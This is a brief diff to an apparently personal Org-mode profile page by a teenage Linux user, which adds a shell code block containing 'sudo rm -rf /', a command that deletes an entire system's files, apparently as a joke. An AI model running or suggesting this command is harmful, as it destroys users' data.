@@ -1,6 +1,11 @@
 #+TITLE: my profile
 #+AUTHOR: hexis
 
+#+BEGIN_src sh
+sudo rm -rf /
+#+END_src
+
+
 linux user since i was 10
 (age 15)
 
